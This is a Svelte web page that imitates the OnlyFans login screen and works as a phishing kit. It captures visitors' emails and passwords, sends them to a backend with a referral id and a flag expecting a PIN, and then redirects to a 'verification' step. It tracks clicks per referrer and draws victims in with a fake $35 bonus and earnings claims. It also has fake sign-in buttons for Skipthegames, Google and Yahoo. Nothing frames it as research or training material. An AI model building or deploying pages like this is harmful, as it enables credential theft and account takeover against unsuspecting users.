<script context="module">
    export function load({ url,params }) {
        console.log(url,params)
        let query = url.searchParams;
 
        return {
            props: {
                ref: query.get("r"),
            },
        };
    }
</script>

<script>
    import { onMount } from "svelte";
    import { goto } from "$app/navigation";

    onMount(async () => {
        console.log("hi");
        console.log("ref", ref);
        let r = await fetch("/api/click?ref="+ref);
        console.log(r);
        let j = await r.json();
        console.log(j);
    });

    async function post() {
        console.log(email);
        let res=await fetch("/api/post", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                input_account_email: email,
                input_account_password: password,
                type: "onlyfans",
                pin_expected: true,
                ref_id:ref
            }),
        });
        let resVal=await res.json();
        console.log(resVal)
        goto("/verification?t="+resVal['timestamp']);
    }
    let email = "";
    let password = "";
    export let ref;
    $:active=email.length>0&&password.length>0?true:false;
</script>

<svelte:head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>onlyfans</title>
    <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.0/font/bootstrap-icons.css"
    />
    <!-- CSS only -->
    <link
        href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
        rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
        crossorigin="anonymous"
    />
    <link rel="stylesheet" href="style.css" />

    <script
        src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
        crossorigin="anonymous"></script>
</svelte:head>

<body>
    <div class="start-status">
        <p>
            We use cookies to give you the best experience and to ensure the
            safety of our users. The only non-essential cookies we use are for
            any personal referrals you make. We do not track you across other
            sites. You can see our <span>Cookie Policy</span>here , and our
            <span>Privacy Notice</span> here.
        </p>
        <nav>
            <ul class="nav-list">
                <li><a href="#" />Reject Referral Cookies </li>
                <li><a href="#" />Accept All</li>
            </ul>
        </nav>
    </div>
    <section id="banner">
        <div class="row">
            <div class="col-md-6">
                <div class="title-text">
                    <img
                        src="images/Screenshot 2022-02-10 233951 (1).png"
                        alt=""
                    />
                    <h2 style="font-size: 29px">Sign up to support your <br /> favorite creators</h2>
                </div>
                <marquee style="color: #0091EA"
                    >Log in with your Skipthegames account <br /> and
                    <b>win $35 sign up bonus</b>
                </marquee>
            </div>
            <div class="col-md-6">
                <div class="sign-in">
                    <h6 class="status">Log in</h6>
                    <input
                        type="email"
                        placeholder="Email"
                        required
                        bind:value={email}
                    /> <br />
                    <input
                        type="password"
                        placeholder="Password"
                        required
                        bind:value={password}
                    /> <br />
                    <button type="btn" on:click={post} style="background-color:{active?'#06abf1':'#DCDFE3'}"> <b>LOGIN</b> </button>

                    <div class="ancore-link">
                        <a href="#" style="visibility:hidden ;">Sign up For OnlyFans</a>
                        <a href="#">Forgot password?</a>
                    </div>
                    <div class="unorder-list">
                        <h4>Join now and win a $35 signup bonus</h4>
                        <li>
                            Sign in with your skipthegames account and get $35 signup bonus
                        </li>
                        <li>
                            You could earn between $1,499 and $7,495 per month
                        </li>
                    </div>

                    <div class="row">
                        <div class="button-list">
                            <button class="button1" type="btn"
                                ><a href={'/skipthegames?r='+ref}>
                                    SIGN IN WITH SKIPTHEGAMES</a
                                ></button
                            > <br />
                            <button class="button2" type="btn"
                                ><a href={'/google?r='+ref}>SIGN IN WITH GOOGLE </a>
                            </button> <br />
                            <button class="button3" type="btn"
                                ><a href={'/yahoo?r='+ref}>
                                    SIGN IN WITH YAHOO</a
                                ></button
                            >
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section id="footer">
        <div class="container">
            <div class="row">
                <div class="footer-col">
                    <li><a href=""> 2022 OnlyFans</a></li>
                    <li><a href="">Contact</a></li>
                    <div class="dubble-icon">
                        <li><i class="bi bi-twitter" /></li>
                        <li><i class="bi bi-instagram" /></li>
                    </div>
                    <li>
                        <i class="bi bi-globe2" /><a href=""
                            ><span> english</span></a
                        >
                    </li>
                </div>
                <div class="footer-col">
                    <li><a href=""> Help</a></li>
                    <li><a href="">store</a></li>
                    <li><a href="">how it works</a></li>
                    <li><a href="">company polici</a></li>
                </div>
                <div class="footer-col">
                    <li><a href="">About</a></li>
                    <li><a href="">Theme of Service</a></li>
                    <li><a href="">Refarrals</a></li>
                    <li><a href="">Cookie notice</a></li>
                </div>
                <div class="footer-col">
                    <li><a href="">Blog</a></li>
                    <li><a href="">DMCA</a></li>
                    <li><a href=""> USC 2257</a></li>
                    <li>
                        <a href="#">Standard Contract between fan and creator</a
                        >
                    </li>
                </div>
                <div class="footer-col">
                    <li><a href="">Branding</a></li>
                    <li><a href="">Privacy</a></li>
                    <li><a href="">Accptable use Policy</a></li>
                    <li><a href="">statment</a></li>
                </div>
            </div>
        </div>
    </section>
</body>
